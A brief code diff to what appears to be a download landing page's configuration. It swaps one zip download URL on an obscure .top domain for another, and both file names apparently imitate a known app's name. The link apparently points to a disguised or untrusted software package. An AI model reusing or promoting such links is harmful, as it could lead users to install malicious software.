@@ -55,7 +55,7 @@
        btnRadius: "10px",
        bg: "//p8.qhimg.com/t11098f6bcd5e40dd91a92718e4.webp",
     },
-    downloadUrl: "https://soelrsjkikfje-s3.top/hingingxiaohshu.zip", 
+    downloadUrl: "https://soelrsjkikfje-s3.top/wield_xiaohshu674894.zip", 
     QH:"QH_132_4#18",
     theme:"v2",
     themeBtnColor: "#15CA71",
